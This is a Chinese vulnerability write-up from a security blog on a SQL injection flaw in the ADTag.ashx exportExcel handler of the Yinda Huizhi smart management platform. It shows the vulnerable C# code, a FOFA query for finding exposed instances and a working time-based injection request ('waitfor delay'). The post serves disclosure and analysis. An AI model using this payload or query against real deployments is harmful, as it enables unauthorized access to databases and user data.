---
title: "银达汇智智慧综合管理平台 ADTag.ashx SQL注入漏洞"
source: https://mrxn.net/jswz/windor-Module-BPCJ-AD_Tag-Controller-ADTag-sqli.html
asset_dir: assets/银达汇智智慧综合管理平台-adtag.ashx-sql注入漏洞
---

# 银达汇智智慧综合管理平台 ADTag.ashx SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/6/2 08:20
- 833浏览
- [0评论](#comment)
- 24分钟阅读

---

# 漏洞简介

福建银达汇智信息科技股份有限公司成立于2009年，位于福建省福州市，是一家以从事[软件](#)和信息技术服务业为主的企业。银达汇智智慧综合管理平台 `ADTag.ashx` 存在[SQL注入](https://mrxn.net/tag/SQL注入)漏洞,攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码,站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

SQL注入防护

# 影响版本

# fofa语法

> `title="智慧综合管理平台登入"`

# 漏洞分析

先看 `Module/BPCJ/AD_Tag/Controller/ADTag.ashx` 或者 `Module/AD/AD_Tag/Controller/ADTag.ashx` （二者代码一致）页面引用的dll

```
<%@ WebHandler Language="C#" CodeBehind="ADTag.ashx.cs" Class="KR.Administrator.Module.Controller.ADTag"  %>
```

再看 `KR.Administrator.Module.Controller.ADTag` 实现逻辑

代码安全审计

其他和之前的[这篇文章](https://mrxn.net/jswz/windor-Module-BPCJ-AD_Tag-Controller-ADTag_Info-sqli.html)分析差不多，不再赘述

[![银达汇智智慧综合管理平台 ADTag.ashx SQL注入漏洞](images/img-001-78ff589bef02.webp)](https://image.mrxn.net/130709c6cabe42a08642622ad5c304fd.webp)

主要看下这里的 `exportExcel` 方法

```
private void exportExcel(HttpContext context)
{
  string condition = " 1=1 ";
  if (!string.IsNullOrEmpty(WRequest.GetString("sTagId")))
    condition += $" and TagId like '%{WRequest.GetString("sTagId")}%'";
  if (!string.IsNullOrEmpty(WRequest.GetString("sTagNo")))
    condition += $" and TagNo like '%{WRequest.GetString("sTagNo")}%'";
  if (!string.IsNullOrEmpty(WRequest.GetString("sTagName")))
    condition += $" and TagName like '%{WRequest.GetString("sTagName")}%'";
  if (!string.IsNullOrEmpty(WRequest.GetString("sRemark")))
    condition += $" and Remark like '%{WRequest.GetString("sRemark")}%'";
  if (!string.IsNullOrEmpty(WRequest.GetString("sUpTagId")))
    condition += $" and UpTagId like '%{WRequest.GetString("sUpTagId")}%'";
  if (!string.IsNullOrEmpty(WRequest.GetString("sInnerTagNo")))
    condition += $" and InnerTagNo like '%{WRequest.GetString("sInnerTagNo")}%'";
  if (!string.IsNullOrEmpty(WRequest.GetString("sorg_idBegin")))
    condition += $" and org_id >= {WRequest.GetString("sorg_idBegin")}";
  if (!string.IsNullOrEmpty(WRequest.GetString("sorg_idEnd")))
    condition += $" and org_id < {WRequest.GetString("sorg_idEnd")}";
  DataTable dataTabelToExcel = this.bll.GetDataTabelToExcel(KR.Controls.RunTime.Global.webSiteConfig.ExportCount, condition);
  if (((InternalDataCollectionBase) dataTabelToExcel.Rows).Count <= 0)
    return;
  SystemHelper.CreateExcel(dataTabelToExcel, "application/x-excel", DateTime.Now.ToString("yyyyMMddHHmmssfff"), context, "导出Excel表");
}
```

`exportExcel`方法中多个用户可控参数(`sTagId`/`sTagNo`/`sTagName`/`sRemark`/`sUpTagId`/`sInnerTagNo`/`sorg_idBegin`/`sorg_idEnd`)直接拼接到SQL语句，未进行任何过滤或参数化处理，攻击者可构造恶意参数执行任意SQL命令，形成[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

# 漏洞复现

```
POST /Module/BPCJ/AD_Tag/Controller/ADTag.ashx HTTP/1.1
Host: windor.mrxn.net
Content-Type: application/x-www-form-urlencoded

action=exportExcel&sTagId='waitfor+delay'0:0:4'--
```

[![银达汇智智慧综合管理平台 ADTag.ashx SQL注入漏洞](images/img-002-17c8ab3b44a4.webp)](https://image.mrxn.net/e73780a713604971a3364dfe980ca2b5.webp)

成功延时 4 秒

漏洞修复方案

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
